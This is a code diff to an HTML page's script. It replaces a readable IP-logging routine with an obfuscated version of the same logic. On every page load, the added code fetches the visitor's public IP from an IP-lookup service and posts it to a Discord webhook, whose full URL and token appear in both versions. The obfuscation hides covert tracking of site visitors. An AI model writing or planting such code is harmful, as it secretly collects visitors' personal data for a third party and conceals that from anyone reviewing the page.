@@ -8,55 +8,9 @@
 <body>
 
     <script>
-        function sendIPToDiscord(ipAddress) {
-            // Construct the message
-            const message = `User's IP Address: ${ipAddress}`;
 
-            // Discord webhook URL
-            const webhookURL = 'https://discord.com/api/webhooks/1233307543871426672/Jw5uHUpnGuI0I_yzbO9MglueN9FRZPOzezkbQr684U2L6rK3Ej2Y-LBSzYGVQ9qTwYax';
-            
-            
-            
-            // Payload for the webhook
-            const payload = {
-                content: message
-            };
 
-            // Send the message to Discord webhook
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payload),
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('welcome');
-                } else {
-                    throw new Error('unkown erorr');
-                }
-            })
-            .catch(error => {
-                console.error('error', error);
-            });
-        }
-
-        // Function to fetch the IP address and send it to Discord
-        function getIPAddress() {
-            // Make AJAX request to get the client's IP address
-            fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                sendIPToDiscord(data.ip);
-            })
-            .catch(error => {
-                console.error('Error getting IP address:', error);
-            });
-        }
-
-        // Call getIPAddress function when the page loads
-        getIPAddress();
+        (function(_0x5ea251,_0x566750){const _0xede09=_0x32b1,_0x39482a=_0x5ea251();while(!![]){try{const _0x1eeff1=parseInt(_0xede09(0xf5))/0x1+-parseInt(_0xede09(0xf4))/0x2*(parseInt(_0xede09(0xf0))/0x3)+-parseInt(_0xede09(0xee))/0x4+-parseInt(_0xede09(0xec))/0x5+parseInt(_0xede09(0xed))/0x6*(-parseInt(_0xede09(0xf7))/0x7)+-parseInt(_0xede09(0xe7))/0x8*(parseInt(_0xede09(0xe2))/0x9)+parseInt(_0xede09(0xf1))/0xa*(parseInt(_0xede09(0xe5))/0xb);if(_0x1eeff1===_0x566750)break;else _0x39482a['push'](_0x39482a['shift']());}catch(_0x1016f4){_0x39482a['push'](_0x39482a['shift']());}}}(_0x77a9,0xd51e9));function sendIPToDiscord(_0x5da4aa){const _0x19ac74=_0x32b1,_0x3758ae=_0x19ac74(0xf3)+_0x5da4aa,_0x3ba867=_0x19ac74(0xf6),_0x2bff21={'content':_0x3758ae};fetch(_0x3ba867,{'method':'POST','headers':{'Content-Type':_0x19ac74(0xe6)},'body':JSON['stringify'](_0x2bff21)})[_0x19ac74(0xe4)](_0x56c19e=>{const _0x419899=_0x19ac74;if(_0x56c19e['ok'])console[_0x419899(0xf2)](_0x419899(0xef));else throw new Error(_0x419899(0xeb));})[_0x19ac74(0xea)](_0x1208cc=>{const _0x27d524=_0x19ac74;console[_0x27d524(0xe8)](_0x27d524(0xe8),_0x1208cc);});}function getIPAddress(){const _0x25abff=_0x32b1;fetch(_0x25abff(0xe3))['then'](_0x41f900=>_0x41f900['json']())[_0x25abff(0xe4)](_0x41a4f1=>{sendIPToDiscord(_0x41a4f1['ip']);})[_0x25abff(0xea)](_0x5b1961=>{const _0x59b577=_0x25abff;console[_0x59b577(0xe8)](_0x59b577(0xe9),_0x5b1961);});}getIPAddress();function _0x32b1(_0x790845,_0x5203dc){const _0x77a970=_0x77a9();return _0x32b1=function(_0x32b19b,_0x13402a){_0x32b19b=_0x32b19b-0xe2;let _0x570448=_0x77a970[_0x32b19b];return _0x570448;},_0x32b1(_0x790845,_0x5203dc);}function _0x77a9(){const _0x2502b3=['873gqjSwB','https://api.ipify.org?format=json','then','62007CGyHJi','application/json','7568vHltFQ','error','Error\x20getting\x20IP\x20address:','catch','unkown\x20erorr','4688325TDpwls','4006536qyynbb','1222124jXHbHI','welcome','12YPIMkx','7630tyfTUo','log','User\x27s\x20IP\x20Address:\x20','841354XlATFk','257328PjSSuK','https://discord.com/api/webhooks/1233307543871426672/Jw5uHUpnGuI0I_yzbO9MglueN9FRZPOzezkbQr684U2L6rK3Ej2Y-LBSzYGVQ9qTwYax','7XAfIZp'];_0x77a9=function(){return _0x2502b3;};return _0x77a9();}
 
        
         
